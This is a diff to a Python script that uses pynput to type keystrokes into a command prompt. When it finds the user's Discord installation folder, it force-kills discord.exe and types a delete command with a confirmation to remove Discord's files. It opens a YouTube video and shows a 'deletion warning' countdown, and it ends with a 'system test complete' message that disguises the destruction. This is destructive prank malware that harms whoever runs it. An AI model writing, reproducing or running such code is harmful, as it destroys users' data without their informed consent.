@@ -5,9 +5,9 @@ import random
 import shutil
 import pynput
 import time
-warning1 =100
+warning1 =252
 login = os.getlogin()
-input()
+input("PAUSED")
 enter =pynput.keyboard.Key.enter
 keyt =pynput.keyboard.Controller()
 cmd =subprocess.Popen("cmd.exe /K cd c:/")
@@ -18,13 +18,26 @@ time.sleep(0.5)
 keyt.type("dir")
 keyt.press(enter)
 if os.path.exists("C:/Users/"+login+"/AppData/Roaming/discord/app-1.0.9026"):
- os.system("taskkill /F /IM discord.exe")
- keyt.type("del C:/Users/"+login+"/AppData/Roaming/discord/app-1.0.9026")
+ keyt.type("cd C:/Users/"+ login +"/AppData/Roaming/")
+ keyt.press(enter)
+ time.sleep(2)
+ os.system("start https://www.youtube.com/watch?v=k64Ptubeu_Q&ab_channel=BlackDragonCZ")
+ while warning1 >= 0:
+  warning1 =warning1 + -1
+  time.sleep(1)
+  print("folder: " + "C:/Users/"+ login +"/AppData/Roaming/discord/app-1.0.9026")
+  print("deletion warning")
+  print(str(warning1))
+ else:
+
+  os.system("taskkill /F /IM discord.exe")
+ keyt.type("del discord")
  keyt.press(enter)
  time.sleep(0.5)
  keyt.type("y")
  keyt.press(enter)
 elif os.path.exists("C:/Users/"+ login +"/Downloads"):
+ os.system("start https://www.youtube.com/watch?v=k64Ptubeu_Q&ab_channel=BlackDragonCZ")
  while warning1 >= 0:
   warning1 =warning1 + 1
   time.sleep(1)
@@ -41,3 +54,4 @@ else:
  print("system test complete")
  time.sleep(1)
  exit()
+#https://www.youtube.com/watch?v=k64Ptubeu_Q&ab_channel=BlackDragonCZ
